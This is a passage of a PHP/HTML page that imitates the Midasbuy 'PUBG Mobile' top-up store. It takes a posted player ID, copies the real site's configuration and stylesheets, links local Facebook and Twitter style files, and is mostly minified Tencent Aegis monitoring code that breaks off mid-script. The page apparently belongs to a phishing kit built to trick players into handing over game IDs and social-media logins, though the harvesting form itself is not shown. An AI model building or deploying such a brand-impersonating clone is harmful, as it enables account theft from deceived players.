<?php
// MENANGKAP DATA YANG DI-INPUT
$playid = $_POST['playid'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($playid == ""){
header("Location: index.php");
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="format-detection" content="telephone=no,email=no">
<meta name="robots" content="index,follow">
<title>PUBG Mobile - Midasbuy</title>
<meta name="keywords" content=""/>
<meta name="description" content=""/>
<script type="text/javascript">
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/serviceWorker');
        }
    </script>
<script type="text/javascript">
        if(!window.console){window.console = {
            log:function () { },
            info:function () { },
            error:function () { }
        }}
/*        window.onerror = function (msg, url, lineNo, columnNo, error) {
                var message = [
                    'Message: ' + msg,
                    'URL: ' + url,
                    'Line: ' + lineNo,
                    'Column: ' + columnNo,
                    'Error object: ' + JSON.stringify(error)
                ].join(' - ');
                if(window.report && window.report.error){
                    report.error('runtime',{message:message});
                }
            return false;
        };
        window.addEventListener && window.addEventListener('error', function(event) {
            if(event.srcElement instanceof HTMLScriptElement || event.srcElement instanceof HTMLLinkElement || event.srcElement instanceof HTMLImageElement){
                var da ={url:event.srcElement.src||event.srcElement.href};
                if(window.report && window.report.error){
                    report.error('resource',da);
                }
            }
        }, true);*/
        window.__PAY_INFO={"needSelectPF":{},"short_openid_type":"idip","short_openid_rule":"^[1-9]\\d+$","isv3":false,"shopcartv2":false,"drm_info":{"groupid":"","area":"Other","country":"OT","midasbuyArea":"Other"},"midasUser":null,"currentBindUser":null,"gameUsers":[],"openid":"","appid":"1450015065","UUID":"018175969678438111599571168370","pf":"mds_hkweb_pc-v2-android-midasweb-midasbuy","type":"save","currencyIcon":"https://midas.gtimg.cn/store_config/1599549775068xtoGCDwY.png","currencySmallIcon":"https://midas.gtimg.cn/midasbuy/images/PUBGM_topup_smallicon.png","currencyIconMap":[{"icon":"https://midas.gtimg.cn/store_config/1599546007887MVeNUtB6.png","max":"299"},{"icon":"https://midas.gtimg.cn/store_config/1599546030876PIvqwGaa.png","max":"599","min":"300"},{"icon":"https://midas.gtimg.cn/store_config/1599546041426W8hmErMS.png","max":"1499","min":"600"},{"icon":"https://midas.gtimg.cn/store_config/1599546052747L5gSu7VB.png","max":"2999","min":"1500"},{"icon":"https://midas.gtimg.cn/store_config/1599546061912PLgMlY23.png","max":"5999","min":"3000"},{"icon":"https://midas.gtimg.cn/store_config/1599546071746KqkIhrzG.png","min":"6000"}],"country":"OT","midasbuyArea":"Other","cgi_language":"EN","sandbox":"0","zoneid":"1","not_query_drm":"0","currency_type":"USD","currency_config":{"currencySymbol":" USD"},"adyen_url":"","adyen_svrtime":""};
        if(window.__PAY_INFO){
            window.__PAY_INFO.pageid = "page_"+(Math.random().toString().replace(".",""));
        }
        window.__Report_INFO={"devMode":false,"tid":"018175969678438111599571168370","openid":"","appid":"","pf":"","countryCode":"ot","from":"","midasuid":"uv_018175969678438111599571168370","reportUrl":"https://report.midasbuy.com/cgi-bin/log_data.fcg"};
        window.defaultDisableGaCountryList=[];
        window.__RTL=false;
        window._SHOPCODE = "midasbuy";
        window.__showErrorDetail={"ae":"*","bd":"*","bh":"*","br":"*","ch":"*","de":"*","dz":"*","eg":"*","es":"*","fr":"*","gb":"*","hk":"*","id":"*","in":"*","iq":"*","ir":"*","it":"*","kh":"*","kw":"*","la":"*","lk":"*","ly":"*","ma":"*","mm":"*","mx":"*","my":"*","nl":"*","np":"*","om":"*","ot":"*","ph":"*","pk":"*","pl":"*","qa":"*","ru":"*","sa":"*","se":"*","sg":"*","th":"*","tn":"*","tr":"*","tw":"*","za":"*"}
    </script>
<link rel="stylesheet" href="https://www.midasbuy.com/oversea_web/static/css/banner-d9b07f5be4.css">
<link rel="stylesheet" href="https://www.midasbuy.com/oversea_web/static/css/vendor-3e54508c8d.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="css/facebook.css">
<link rel="stylesheet" href="css/twitter.css">
<!--[if lte IE 9]><link rel="stylesheet" href="/oversea_web/static/css/ie-fb84380fda.css"><![endif]-->
<!-- aegis上报开关 -->
<script type="text/javascript">
    // aegis-web-sdk@1.20.0
    !function(e,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):(e=e||self).Aegis=t()}(this,function(){"use strict";var o=function(e,t){return(o=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var n in t)t.hasOwnProperty(n)&&(e[n]=t[n])})(e,t)};function f(e,t){function n(){this.constructor=e}o(e,t),e.prototype=null===t?Object.create(t):(n.prototype=t.prototype,new n)}var y=function(){return(y=Object.assign||function(e){for(var t,n=1,o=arguments.length;n<o;n++)for(var r in t=arguments[n])Object.prototype.hasOwnProperty.call(t,r)&&(e[r]=t[r]);return e}).apply(this,arguments)};var v,c,e,t,i=(n.prototype.indexOf=function(e,t){for(var n=0;n<e.length;n++)if(e[n].callback===t)return n;return-1},n.prototype.on=function(e,t,n){if(void 0===n&&(n=0),this){var o=this.__EventsList[e];if(o=o||(this.__EventsList[e]=[]),-1!==this.indexOf(o,t))return this;var r={name:e,type:n||0,callback:t};return o.push(r),this}},n.prototype.one=function(e,t){this.on(e,t,1)},n.prototype.remove=function(e,t){if(this){var n=this.__EventsList[e];if(!n)return null;if(!t){try{delete this.__EventsList[e]}catch(e){}return null}if(n.length){var o=this.indexOf(n,t);n.splice(o,1)}return this}},n);function n(){var s=this;this.emit=function(e,t){if(s){var n,o=s.__EventsList[e];if(o&&o.length){o=o.slice();for(var r=0;r<o.length;r++){n=o[r];try{var i=n.callback.apply(s,[t]);if(1===n.type&&s.remove(e,n.callback),!1===i)break}catch(e){throw e}}}return s}},this.__EventsList={}}function w(e){return(e=Array.isArray(e)?e:[e]).map(function(t,n){return Object.getOwnPropertyNames(t).map(function(e){return r(e)+"["+n+"]="+r(t[e])}).join("&")}).join("&")+(e.length?"&count="+e.length:"")}function r(e){try{return encodeURIComponent(decodeURIComponent(e))}catch(e){return""}}function s(e,t){return"number"==typeof e?e:"string"==typeof e?e:t?c.string:c.number}function l(e,t){return"string"==typeof e?e.split("?")[t?1:0]||"":e}function d(e){return/^https/.test(e)}function a(){return void 0!==window.performance&&"function"==typeof(e=window.Performance)&&/native code/.test(e.toString())&&"function"==typeof performance.clearResourceTimings&&"function"==typeof performance.getEntriesByType&&"function"==typeof performance.now;var e}(t=v=v||{}).INFO_ALL="-1",t.API_RESPONSE="1",t.INFO="2",t.ERROR="4",t.PROMISE_ERROR="8",t.AJAX_ERROR="16",t.SCRIPT_ERROR="32",t.IMAGE_ERROR="64",t.CSS_ERROR="128",t.CONSOLE_ERROR="256",t.MEDIA_ERROR="512",t.RET_ERROR="1024",t.REPORT="2048",(e=c=c||{})[e.number=-1]="number",e.string="";var u=["application/octet-stream","application/xhtml+xml","application/xml","application/pdf","application/pkcs12","application/javascript","application/ecmascript","application/vnd.mspowerpoint","application/ogg","text/html","text/css","text/javascript","image","audio","video"];function p(t){return u.some(function(e){return-1!==t.indexOf(e)})}function g(e,t){try{if("string"==typeof e&&(e=JSON.parse(e)),t&&t.ret){var n=t.ret;h=[].concat(n)}var o=Object.getOwnPropertyNames(e).filter(function(e){return-1!==h.indexOf(e.toLowerCase())});return o.length?""+e[o[0]]:"unknown"}catch(e){return"unknown"}}function b(e){try{return(JSON.stringify(e,(o=[],r=[],function(e,t){if(t instanceof Error)return"Error.message【 "+t.message+" 】;  Error.stack【 "+t.stack+" 】";if("object"==typeof t&&null!==t){var n=o.indexOf(t);if(-1!==n)return"[Circular "+r[n]+"]";o.push(t),r.push(e||"root")}return t}),4)||"undefined").replace(/"/gim,"")}catch(e){return"error happen when aegis stringify: \n "+e.message+" \n "+e.stack}var o,r}var h=["ret","retcode","code"],m=(Object.defineProperty(E.prototype,"sourceURL",{get:function(){return this.data.responseURL},enumerable:!0,configurable:!0}),Object.defineProperty(E.prototype,"status",{get:function(){return Number(this.data.status)},enumerable:!0,configurable:!0}),Object.defineProperty(E.prototype,"headers",{get:function(){var e=this.data.getAllResponseHeaders().split("\n"),r={};return e.forEach(function(e){if(e){var t=e.split(": "),n=t[0],o=t[1].trim();r[n]=o}}),r},enumerable:!0,configurable:!0}),E),O=(Object.defineProperty(x.prototype,"sourceURL",{get:function(){return this.data.url},enumerable:!0,configurable:!0}),Object.defineProperty(x.prototype,"status",{get:function(){return Number(this.data.status)},enumerable:!0,configurable:!0}),Object.defineProperty(x.prototype,"headers",{get:function(){var n={};return this.data.headers.forEach(function(e,t){n[t]=e}),n},enumerable:!0,configurable:!0}),x),R=[];function x(e,t){this.type="fetch",this.data=e||{},this.data.response=t}function E(e){this.type="xhr",this.data=e}function _(t){R.forEach(function(e){e(t)})}var L=!1,C=!1,S=["img","css","script","link","audio","radio"],A=[];function I(t){A.forEach(function(e){e(t)})}var P=0;function T(){var e,t=performance.getEntriesByType("resource"),n=t.slice(P);P=t.length;for(var o=0,r=n.length;o<r;o++){var i=n[o];-1!==S.indexOf(i.initiatorType)&&I({url:l((e=i).name),method:"get",duration:Number(e.duration.toFixed(2)),status:200,type:"static",isHttps:d(e.name),urlQuery:l(e.name,!0),x5ContentType:s(e.x5ContentType,!0),x5HttpStatusCode:s(e.x5HttpStatusCode),x5ImgDecodeStatus:s(e.x5ImgDecodeStatus),x5ErrorCode:s(e.x5ErrorCode),x5LoadFromLocalCache:void 0===e.x5LoadFromLocalCache?c.number:0|e.x5LoadFromLocalCache,x5ContentLength:e.encodedBodySize||s(e.x5ContentLength),domainLookup:s(e.domainLookupEnd-e.domainLookupStart),connectTime:s(e.connectEnd-e.connectStart)})}}var j,k=[];function N(e,t){var n=[];for(var o in e)n.push(o+"="+e[o]);k.forEach(function(e){e({url:t.config.performanceUrl+"?"+n.join("&")})}),k.length=0}function D(e){if(!e||!e.getBoundingClientRect)return!1;var t=e.getBoundingClientRect(),n=window.innerHeight,o=window.innerWidth;return 0<=t.left&&t.left<o&&0<=t.top&&t.top<n}var q=!1,M=[];function U(t){M.forEach(function(e){e(t)})}var H=[];function X(t){H.forEach(function(e){e(t)})}var B=!1;function F(e){return window.btoa&&window.btoa(JSON.stringify({ids:{trace_id:{high:J(),low:J()},span_id:J(),parent_id:0,flag:2},baggages:{aegis_session_id:e._sessionID}}))}function J(){return parseInt(new Array(53).fill(1).map(function(){return.5<Math.random()?1:0}).join(""),2)}function G(e){var t=document.createElement("a");return t.href=e,location.origin===t.origin}var W,Q,K,Y,z,V,Z=navigator.userAgent;function $(n,o){var r;void 0===n&&(n=0);var i=[];return function(e,t){if(i.push(e),o&&i.length>=o)return t(i.splice(0,i.length)),void(r&&clearTimeout(r));r&&clearTimeout(r),r=setTimeout(function(){r=null,t(i.splice(0,i.length))},n)}}(V=W=W||{})[V.android=1]="android",V[V.ios=2]="ios",V[V.other=100]="other",(z=Q=Q||{})[z.oldX5=1]="oldX5",z[z.newX5=2]="newX5",z[z.other=3]="other",(Y=K=K||{})[Y.unknown=100]="unknown",Y[Y.wifi=1]="wifi",Y[Y.net2g=2]="net2g",Y[Y.net3g=3]="net3g",Y[Y.net4g=4]="net4g",Y[Y.net5g=5]="net5g",Y[Y.net6g=6]="net6g";function ee(e,t){return Array.isArray(e)?t(e.map(function(e){return{msg:"string"==typeof e.msg?e.msg:b(e.msg),level:e.level}})):t({msg:"string"==typeof e.msg?e.msg:b(e.msg),level:e.level})}function te(r){return function(t,n){var e,o;e=r.config.getNetworkType,o=function(e){r.extendBean("netType",e),n(t)},(e||function(e){var t;e((t=navigator.connection&&navigator.connection.type?navigator.connection.type:"unknown",0<=(t=String(t).toLowerCase()).indexOf("2g")?K.net2g:0<=t.indexOf("3g")?K.net3g:0<=t.indexOf("4g")?K.net4g:0<=t.indexOf("5g")?K.net5g:0<=t.indexOf("6g")?K.net6g:0<=t.indexOf("wifi")?K.wifi:K.unknown))})(function(e){K[e]||(e=K.unknown),o(e)})}}var ne=function(){};function oe(n){if(!n||!n.reduce||!n.length)throw new TypeError("createPipeline need at least one function param");return 1===n.length?function(e,t){n[0](e,t||ne)}:n.reduce(function(n,o){return function(e,t){return void 0===t&&(t=ne),n(e,function(e){return o&&o(e,t)})}})}var re=(ie.prototype.init=function(e,t){var n=this;this.setConfig(e),ie.installedPlugins.forEach(function(e){e.call(n,t)}),this.lifeCycle.emit("onInited")},ie.prototype.setConfig=function(e){return Object.assign(this.config,e),this.bean.id=this.config.id||"",this.bean.uin=this.config.uin||"",this.bean.version=this.config.version||"1.20.0",this.lifeCycle.emit("onConfigChange",e),this.config},ie.prototype.extendBean=function(e,t){this.bean[e]=t},ie.use=function(e){-1===ie.installedPlugins.indexOf(e)&&ie.installedPlugins.push(e)},ie.prototype.send=function(e,t,n){throw new Error('You need to override "send" method')},ie.prototype._sendSDKError=function(e){this.send({url:"https://aegis.qq.com/collect?id=1085&msg[0]="+encodeURIComponent(b(e))+"&level[0]=2&from="+this.config.id+"&count=1&version="+this.config.id+"(1.20.0)",addBean:!1,method:"get"})},ie.prototype.info=function(e){this._normalLogPipeline({msg:e,level:v.INFO})},ie.prototype.infoAll=function(e){this._normalLogPipeline({msg:e,level:v.INFO_ALL})},ie.prototype.report=function(e){this._normalLogPipeline({msg:e,level:v.REPORT})},ie.prototype.reportPv=function(e){e&&this.send({url:this.config.url+"/"+e,addBean:!1})},ie.prototype.reportTime=function(e,t){"string"==typeof e?"number"==typeof t?this._submitCustomTime(e,t):console.warn("reportTime: second param must be number"):console.warn("reportTime: first param must be a string")},ie.prototype.time=function(e){"string"==typeof e?this._timeMap[e]?console.warn("Timer "+e+" already exists"):this._timeMap[e]=Date.now():console.warn("time: first param must be a string")},ie.prototype.timeEnd=function(e){"string"==typeof e?this._timeMap[e]?(this._submitCustomTime(e,Date.now()-this._timeMap[e]),delete this._timeMap[e]):console.warn("Timer "+e+" does not exist"):console.warn("timeEnd: first param must be a string")},ie.prototype._submitCustomTime=function(e,t){this._customTimePipeline({name:e,duration:t})},ie.installedPlugins=[],ie.LOG_TYPE=v,ie);function ie(e){var n,r=this;this.config={version:0,delay:1500,repeat:5,random:1,url:"https://aegis.qq.com/collect",speedUrl:"https://aegis.qq.com/speed",customTimeUrl:"https://aegis.qq.com/speed/custom",whiteListUrl:"https://aegis.qq.com/aegis/whitelist",performanceUrl:"https://aegis.qq.com/speed/performance",listenOnerror:!0},this.lifeCycle=new i,this.bean={},this._normalLogPipeline=oe([$(this.config.delay,5),(n=this.lifeCycle.emit,function(e,t){return n("beforeWrite",e),t(e)}),function(e){var o=!1,r=!1;setTimeout(function(){e.send({url:e.config.whiteListUrl||""},function(e){try{0===(e=JSON.parse(e)||{}).retcode&&(o=e.result.is_in_white_list)}catch(e){}r=!0},function(){r=!0})},50);var i=[];return function(e,t){if(o)t(e.concat(i.splice(0)).map(function(e){return e.level===v.INFO_ALL&&(e.level=v.INFO),e}));else{var n=e.filter(function(e){if(e.level!==v.INFO&&e.level!==v.API_RESPONSE)return e.level===v.INFO_ALL&&(e.level=v.INFO),!0;r||(i.push(e),200<=i.length&&(i.length=200))});n.length&&t(n)}}}(this),ee,function(e,t){var n=JSON.parse(JSON.stringify(e));r.lifeCycle.emit("beforeReport",n);var o=r.config.beforeReport;if("function"==typeof o&&(e=e.filter(function(e){return!1!==o(e)})),e.length)return t(e)},function(e){r.send({url:r.config.url||"",data:w(e),method:"post",contentType:"application/x-www-form-urlencoded"},function(){var t=r.config.onReport;"function"==typeof t&&e.forEach(function(e){t(e)})})}]),this._timeMap={},this._customTimePipeline=oe([$(this.config.delay),function(e){r.send({url:r.config.customTimeUrl+"?version="+r.config.version+"&payload="+encodeURIComponent(JSON.stringify({custom:e}))})}])}function se(t){if(t.payload){var n={};return Object.keys(t).forEach(function(e){"payload"!==e&&(n[e]=t[e])}),n}return t}function ae(e,a){var u=null,c=null,t=a.shadowLog.pluginUrl||e;function n(e){if(u&&c){var o=a.id,r=a.uin,i=ce.urls.aegisCollect;try{var t=(f(n,s=c),n.prototype.init=function(e){var t={dbConfig:{name:e.namespace},lookupUrl:i+"/shadowLogAuto?id="+o+"&uin="+r,uploadUrl:i+"/shadowLog",preservedDay:7,id:o,uin:r,sessionId:ce._sessionID},n=new u(t);return this.flog=n,s.prototype.init.call(this,e)},n.prototype.postMessage=function(e){var t=e.type,n=e.data;"write"===t&&this.flog.add(n)},n.prototype.report=function(){this.flog.uploadLogs()},new n(a.shadowLog));e.lifeCycle.emit("onShadowLogInit",t)}catch(e){console.log(e)}}function n(){return null!==s&&s.apply(this,arguments)||this}var s}ce.useAsyncPlugin(ce.urls.flog,{exportsConstructor:"Flog",onAegisInitAndPluginLoaded:function(e,t){u=t,n(e)}}),ce.useAsyncPlugin(t,{exportsConstructor:"ShadowLogAegisPlugin",onAegisInitAndPluginLoaded:function(e,t){c=t,n(e)}})}Object.assign||Object.defineProperty(Object,"assign",{enumerable:!1,configurable:!0,writable:!0,value:function(e){if(null==e)throw new TypeError("Cannot convert first argument to object");for(var t=Object(e),n=1;n<arguments.length;n++){var o=arguments[n];if(null!=o){o=Object(o);for(var r=Object.keys(Object(o)),i=0,s=r.length;i<s;i++){var a=r[i],u=Object.getOwnPropertyDescriptor(o,a);void 0!==u&&u.enumerable&&(t[a]=o[a])}}}return t}});var ue,ce=(f(fe,ue=re),Object.defineProperty(fe.prototype,"_bean",{get:function(){var t=this;return Object.getOwnPropertyNames(this.bean).map(function(e){return e+"="+t.bean[e]}).join("&")+"&from="+encodeURIComponent(location.href)+"&referer="+document.referrer},enumerable:!0,configurable:!0}),fe.prototype._initOfflineLog=function(){!function(e,d){var p=[],g=null;function h(e){p.push(e)}function m(e,t){void 0===e&&(e={}),void 0===t&&(t={}),g={conds:e,params:t}}ce.useAsyncPlugin(e,{exportsConstructor:"Flog",onAegisInit:function(e){e.lifeCycle.on("beforeWrite",h),e.lifeCycle.on("uploadLogs",m)},onAegisInitAndPluginLoaded:function(t,e){var n=d.dbConfig,o=void 0===n?{}:n,r=d.url,i=void 0===r?ce.urls.aegisCollect:r,s=d.offlineLogExp,a=void 0===s?3:s,u=d.id,c=d.uin;if(c){t.lifeCycle.remove("beforeWrite",h),t.lifeCycle.remove("uploadLogs",m);var f=Object.assign({lookupUrl:i+"/offlineAuto?id="+u+"&uin="+c,uploadUrl:i+"/offlineLog",preservedDay:a,id:u,uin:c},o,{sessionId:ce._sessionID});try{var l=new e(f);p.forEach(function(e){l.add(e)}),t.lifeCycle.on("beforeWrite",function(e){void 0===e&&(e=[]),e.forEach(function(e){l.add(y({},e))})}),t.lifeCycle.on("uploadLogs",function(e,t){void 0===e&&(e={}),void 0===t&&(t={});var n=Object.assign({id:d.id,uin:d.uin},e);l.uploadLogs(n,t)}),t.lifeCycle.on("onConfigChange",function(e){l.setConfig(e)}),l.on("PERREVENT",function(e){t.send({data:w({msg:b(e),level:v.INFO}),contentType:"application/x-www-form-urlencoded",method:"post",addBean:!1,url:d.url+"?id=893&sessionId="+ce._sessionID+"&uin="+d.uin+"&from="+d.id+"&count=1&version=1.20.0"})}),g&&(t.lifeCycle.emit("uploadLogs",g.conds,g.params),g=null)}catch(t){console.log(t)}}}})}(fe.urls.flog,this.config)},fe.prototype._initShadowLog=function(){ae(fe.urls.shadowLog,this.config)},fe.prototype.uploadLogs=function(e,t){void 0===e&&(e={}),void 0===t&&(t={}),this.lifeCycle.emit("uploadLogs",e,t)},fe.useAsyncPlugin=function(s,e){void 0===e&&(e={});var t=e.exportsConstructor,a=void 0===t?"aegis-plugin-"+this.asyncPluginIndex++:t,n=e.onAegisInit,u=void 0===n?function(){}:n,o=e.onAegisInitAndPluginLoaded,c=void 0===o?function(){}:o;if("string"!=typeof s)throw new TypeError("useAsyncPlugin first param must be string");if("function"!=typeof u||"function"!=typeof c)throw new TypeError("onAegisInit、onAegisInitAndPluginLoaded must be function");this.use(function(){var e,t,n,o,r,i=this;try{u(this),fe._asyncPlugin[s]?c(this,window[fe._asyncPlugin[s]]):(e=s,t=a,n=function(e){if(!e){fe._asyncPlugin[s]=a;var t=window[a];c(i,t)}},o=document.createElement("script"),r=document.head,"function"==typeof t&&(n=t,t=""),o.src=e,o.setAttribute("name",t),o.name=t,o.async=!0,o.onload=o.onreadystatechange=function(){o.readyState&&"loaded"!==o.readyState&&"complete"!==o.readyState||("function"==typeof n&&n(!1),setTimeout(function(){r.removeChild(o)}))},o.onerror=function(){"function"==typeof n&&n(!0),setTimeout(function(){r.removeChild(o)})},r.appendChild(o))}catch(i){console.log("error on below is caused by "+s+"："),console.error(i)}})},Object.defineProperty(fe,"urls",{get:function(){return{aegisCollect:"https://aegis.qq.com/collect",flog:"https://cdn-go.cn/vasdev/web_webpersistance_v2/latest/flog.core.min.js",shadowLog:""}},enumerable:!0,configurable:!0}),fe.__version__="1.20.0",fe._sessionID="session-"+Date.now(),fe.asyncPluginIndex=0,fe._asyncPlugin={},fe);function fe(e){var o,s=ue.call(this,e)||this;s.send=function(e,t,n){if(e&&"string"==typeof e.url&&""!==e.url&&s.bean.id){var o=e.url;!1!==e.addBean&&(o=o+(-1===o.indexOf("?")?"?":"&")+s._bean);var r=e.method||"get",i=new XMLHttpRequest;i.__sendByAegis=!0,i.addEventListener("readystatechange",function(){4===i.readyState&&(400<=i.status?n&&n(i.response):t&&t(i.response))}),"get"===r.toLocaleLowerCase()?(i.open("get",function(e,n){if("string"!=typeof e)return"";if("object"==typeof n&&n){var t=Object.getOwnPropertyNames(n).map(function(e){var t=n[e];return e+"="+("string"==typeof t?encodeURIComponent(t):encodeURIComponent(JSON.stringify(t)))}).join("&").replace(/eval/gi,"evaI");return e+(-1===e.indexOf("?")?"?":"&")+t}return e}(o,e.data)),i.send()):(i.open("post",o),e.contentType&&i.setRequestHeader("Content-Type",e.contentType),"string"==typeof e.data&&(e.data=e.data.replace(/eval/gi,"evaI")),i.send(e.data))}},s._speedLogPipeline=oe([(o={},function(e,t){if(Array.isArray(e)){var n=e.filter(function(e){var t=!o[e.url];return o[e.url]=!0,t});n.length&&t(n)}else o[e.url]||t(e),o[e.url]=!0}),$(s.config.delay),te(s),function(e,t){s.lifeCycle.emit("beforeReportSpeed",e);var n=s.config.beforeReportSpeed;if("function"==typeof n&&(e=e.filter(function(e){var t=!1!==n(e);return"fetch"===e.type&&void 0===e.ret&&e.payload&&(e.ret=g(e.payload.data.response,s.config.api)),t})),e.length)return t(e)},function(e){s.send({url:""+s.config.speedUrl,method:"post",data:function(e,t){var n={fetch:[],static:[]},o=new FormData;if(Array.isArray(e))e.forEach(function(e){var t=se(e);n[e.type].push(t)});else{var r=se(e);n[e.type].push(r)}return o.append("payload",JSON.stringify(y({duration:n},t))),o}(e,s.bean)})}]);try{e.uin=e.uin||parseInt((document.cookie.match(/\buin=\D+(\d*)/)||[])[1],10)||parseInt((document.cookie.match(/\bilive_uin=\D*(\d+)/)||[])[1],10)||"",e.offlineLog&&s._initOfflineLog(),e.shadowLog&&s._initShadowLog(),s.init(e,fe),s.extendBean("sessionId",fe._sessionID)}catch(e){console.warn(e),console.log("%c以上错误发生在初始化 Aegis 的过程中，将会影响您正常使用 Aegis，\n建议您联系 aegis-helper，进行反馈，感谢您的支持。","color: red"),s._sendSDKError(e)}return s}return ce.use(function(){this.config.listenOnerror&&R.push(this._normalLogPipeline),function(){if(!L){L=!0;var n=window.onerror;window.onerror=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];e[4]&&_({msg:e[4],level:v.ERROR}),n&&n.call.apply(n,function(){for(var e=0,t=0,n=arguments.length;t<n;t++)e+=arguments[t].length;var o=Array(e),r=0;for(t=0;t<n;t++)for(var i=arguments[t],s=0,a=i.length;s<a;s++,r++)o[r]=i[s];return o}([window],e))},window.addEventListener("unhandledrejection",function(e){_({msg:"PROMISE_ERROR: "+(e&&b(e.reason)),level:v.PROMISE_ERROR})});var i=0;window.document.addEventListener("error",function(e){if(e&&e.target&&e.srcElement){var t=e.target||e.srcElement,n=t.src||t.href,o=t.tagName;if(n&&o){var r={msg:o+" load fail: "+n,level:v.INFO};switch(o.toLowerCase()){case"script":r.level=v.SCRIPT_ERROR;break;case"link":r.level=v.CSS_ERROR;break;case"img":if(10<i)return;i++,r.level=v.IMAGE_ERROR;break;case"audio":case"video":r.level=v.MEDIA_ERROR;break;default:return}_(r)}}},!0);var e=window.XMLHttpRequest.prototype,t=e.open,o=e.send;e.open=function(){return this.aegisMethod&&this.aegisUrl||(this.aegisMethod=arguments[0],this.aegisUrl=arguments[1]),t.apply(this,arguments)},e.send=function(){return this.__sendByAegis||this.addEventListener("loadend",function(){this.aegisTimeout?_({msg:"AJAX_ERROR: request timeout. status: "+this.status+". \n url: "+this.aegisUrl,level:v.AJAX_ERROR}):0===this.status?_({msg:"AJAX_ERROR: request failed. status: "+this.status+". \n url: "+this.aegisUrl,level:v.AJAX_ERROR}):400<=this.status&&_({msg:"AJAX_ERROR: request error. status: "+this.status+". \n url: "+this.aegisUrl,level:v.AJAX_ERROR})}),this.__sendByAegis||this.addEventListener("timeout",function(){this.aegisTimeout=!0}),o.apply(this,arguments)}}}()}),ce.use(function(){var a,e,t,n;this.config.reportApiSpeed&&(M.push(this._speedLogPipeline),H.push(this._normalLogPipeline),q||(q=!0,function(u){if("function"==typeof window.fetch){var e=window.fetch;window.fetch=function(i,s){var a=Date.now();return e(i,s).then(function(r){try{var e=r.headers?r.headers.get("content-type"):"";r.ok&&"string"==typeof e&&p(e)?U({url:l(r.url),isHttps:d(r.url),method:s&&s.method||"get",duration:Date.now()-a,type:"static",status:r.status,urlQuery:l(r.url,!0),x5ContentType:c.string,x5HttpStatusCode:c.number,x5ImgDecodeStatus:c.number,x5ErrorCode:c.number,x5LoadFromLocalCache:c.number,x5ContentLength:c.number,domainLookup:c.number,connectTime:c.number}):r.clone().text().then(function(e){X({msg:i+" "+e,level:v.API_RESPONSE});var t=g(e,u.api);U({url:l(r.url),isHttps:d(r.url),method:s&&s.method||"get",duration:Date.now()-a,type:"fetch",ret:t||"unknown",status:r.status,payload:new O(r,e)});var n=u.api&&u.api.errCode;n=n&&[].concat(n);var o=u.api&&u.api.code;o=o&&[].concat(o),(n&&-1!==n.indexOf(t)||o&&-1===o.indexOf(t)||!n&&!o&&"0"!==t&&"unknown"!==t)&&X({msg:"request url: "+i+" \n response: "+e,level:v.RET_ERROR})})}catch(e){}return r}).catch(function(e){throw U({url:l(i),isHttps:d(i),method:s&&s.method||"get",duration:Date.now()-a,type:"fetch",status:600}),e})}}}(this.config),a=this.config,e=window.XMLHttpRequest.prototype,t=e.open,n=e.send,e.open=function(){return this.aegisMethod&&this.aegisUrl||(this.aegisMethod=arguments[0],this.aegisUrl=arguments[1]),t.apply(this,arguments)},e.send=function(){var i=Date.now(),s=0;return this.__sendByAegis||this.addEventListener("loadend",function(){var e=this.aegisUrl;if(e){s=Date.now()-i;var t={url:l(e),isHttps:d(e),status:this.status,method:this.aegisMethod||"get",type:"fetch",duration:s,payload:new m(this)},n=this.getResponseHeader("content-type");if(400<=this.status||"string"!=typeof n||!p(n))try{X({msg:"req url: "+e+" \nres time: "+s+" \nres data: "+this.response,level:v.API_RESPONSE}),t.ret=g(this.response,a.api);var o=a.api&&a.api.errCode;o=o&&[].concat(o);var r=a.api&&a.api.code;r=r&&[].concat(r),(o&&-1!==o.indexOf(t.ret)||r&&-1===r.indexOf(t.ret)||!o&&!r&&"0"!==t.ret&&"unknown"!==t.ret)&&X({msg:"request url: "+e+" \n response: "+this.response,level:v.RET_ERROR})}catch(e){t.ret="unknown"}else t.type="static",delete t.ret,Object.assign(t,{urlQuery:l(e,!0),x5ContentType:c.string,x5HttpStatusCode:c.number,x5ImgDecodeStatus:c.number,x5ErrorCode:c.number,x5LoadFromLocalCache:c.number,x5ContentLength:c.number,domainLookup:c.number,connectTime:c.number});U(t)}}),n.apply(this,arguments)}))}),ce.use(function(){a()&&this.config.reportAssetSpeed&&(A.push(this._speedLogPipeline),C||(C=!0,setInterval(T,this.config.delay),performance.onresourcetimingbufferfull=function(){P=0,performance.clearResourceTimings()},window.document.addEventListener("error",function(e){if(e&&e.target&&e.srcElement){var t=e.target||e.srcElement,n=t.src||t.href;n&&I({url:l(n),status:400,method:"get",type:"static",isHttps:d(n),urlQuery:l(n,!0),x5ContentType:c.string,x5HttpStatusCode:c.number,x5ImgDecodeStatus:c.number,x5ErrorCode:c.number,x5LoadFromLocalCache:c.number,x5ContentLength:c.number,domainLookup:c.number,connectTime:c.number})}},!0)))}),ce.use(function(){var c,n,f,l,o=this;if(a())if(k.push(this.send),j)N(j,this);else try{c=function(e){var t=performance.timing,n=t.loadEventStart-t.domInteractive;n<0&&(n=1070),N(j={dnsLookup:t.domainLookupEnd-t.domainLookupStart,tcp:t.connectEnd-t.connectStart,ssl:0===t.secureConnectionStart?0:t.requestStart-t.secureConnectionStart,ttfb:t.responseStart-t.requestStart,contentDownload:t.responseEnd-t.responseStart,domParse:t.domInteractive-t.domLoading,resourceDownload:n,firstScreenTiming:Math.floor(e)},o)},n=["script","style","link","br"],f=[],(l=new MutationObserver(function(e){var 